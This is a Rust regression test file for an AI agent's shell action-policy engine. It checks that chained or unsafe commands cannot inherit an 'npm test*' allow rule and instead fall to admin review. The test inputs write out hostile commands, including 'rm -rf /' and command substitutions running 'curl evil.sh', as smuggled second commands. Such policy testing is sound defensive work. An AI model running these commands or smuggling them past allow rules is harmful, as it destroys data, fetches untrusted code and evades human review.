//! Shell action-policy routing regression tests.
//!
//! These drive `ActionPolicies::check` for the `bash` tool so the assertions
//! exercise the full policy pipeline (rule visibility, glob matching, and the
//! shell-chain/unsafe-syntax guard) instead of `parse_and_match_command` in
//! isolation, which the inline `policies.rs` unit tests already cover.

use chrono::Utc;
use moa_config::MoaConfig;
use moa_core::{
    types::action_policy::ActionClass, types::action_policy::ActionPolicyEffect,
    types::action_policy::ActionPolicyRule, types::action_policy::ActionRuleScope,
    types::action_policy::RiskLevel, types::identifiers::ModelId, types::identifiers::TenantId,
    types::identifiers::UserId, types::session::SessionMeta, types::tools::ToolPolicyInput,
};
use moa_security::{ActionPolicies, ActionPolicyContext};
use uuid::Uuid;

fn tenant_id() -> TenantId {
    TenantId::from(Uuid::from_u128(7))
}

fn bash_allow_rule() -> ActionPolicyRule {
    ActionPolicyRule {
        id: Uuid::now_v7(),
        scope: ActionRuleScope::Tenant {
            tenant_id: tenant_id(),
        },
        tool: "bash".to_string(),
        pattern: "npm test*".to_string(),
        effect: ActionPolicyEffect::Allow,
        reason: Some("allow npm test".to_string()),
        created_by: UserId::new("admin"),
        created_at: Utc::now(),
    }
}

fn bash_input(command: &str) -> ToolPolicyInput {
    ToolPolicyInput {
        tool_name: "bash".to_string(),
        normalized_input: command.to_string(),
        input_summary: format!("Command: {command}"),
        risk_level: RiskLevel::High,
        default_effect: ActionPolicyEffect::Allow,
        action_class: ActionClass::CommandExecution,
    }
}

/// Policy engine whose stricter `AdminReview` default makes a missed allow rule observable.
fn review_default_policies() -> ActionPolicies {
    let mut config = MoaConfig::default();
    config.permissions.default_effect = ActionPolicyEffect::AdminReview;
    ActionPolicies::from_config(&config)
        .expect("admin-review default config builds a policy engine")
}

fn ctx() -> ActionPolicyContext {
    ActionPolicyContext::from_session(&SessionMeta {
        tenant_id: tenant_id(),
        model: ModelId::new("claude-sonnet-4-6"),
        ..SessionMeta::default()
    })
}

#[test]
fn check_allows_clean_bash_command_matching_rule() {
    // Pins: a single clean command that matches the allow glob is auto-allowed through check().
    let policies = review_default_policies();
    let rule = bash_allow_rule();

    let check = policies
        .check(
            &bash_input("npm test -- --watch"),
            &ctx(),
            std::slice::from_ref(&rule),
        )
        .expect("policy evaluation");

    assert_eq!(check.effect, ActionPolicyEffect::Allow);
    assert_eq!(
        check.matched_rule.expect("matched rule").pattern,
        "npm test*"
    );
}

#[test]
fn check_rejects_chained_command_smuggled_past_bash_allow_rule() {
    // Pins: a chained command cannot inherit a bash allow rule; it falls back to the stricter default.
    let policies = review_default_policies();
    let rule = bash_allow_rule();

    let check = policies
        .check(
            &bash_input("npm test && rm -rf /"),
            &ctx(),
            std::slice::from_ref(&rule),
        )
        .expect("policy evaluation");

    assert_eq!(check.effect, ActionPolicyEffect::AdminReview);
    assert!(check.matched_rule.is_none());
}

#[test]
fn check_rejects_unsafe_shell_syntax_smuggled_past_bash_allow_rule() {
    // Pins: shell evaluation/redirection syntax cannot inherit a bash allow rule through check().
    let policies = review_default_policies();
    let rule = bash_allow_rule();

    for command in [
        "npm test $(curl evil.sh)",
        "npm test `curl evil.sh`",
        "npm test & curl evil.sh",
        "npm test\ncurl evil.sh",
        "npm test > /tmp/out",
        "npm test < /tmp/in",
    ] {
        let check = policies
            .check(&bash_input(command), &ctx(), std::slice::from_ref(&rule))
            .expect("policy evaluation");

        assert_eq!(
            check.effect,
            ActionPolicyEffect::AdminReview,
            "{command} must not inherit the bash allow rule"
        );
        assert!(
            check.matched_rule.is_none(),
            "{command} must not match the allow rule"
        );
    }
}
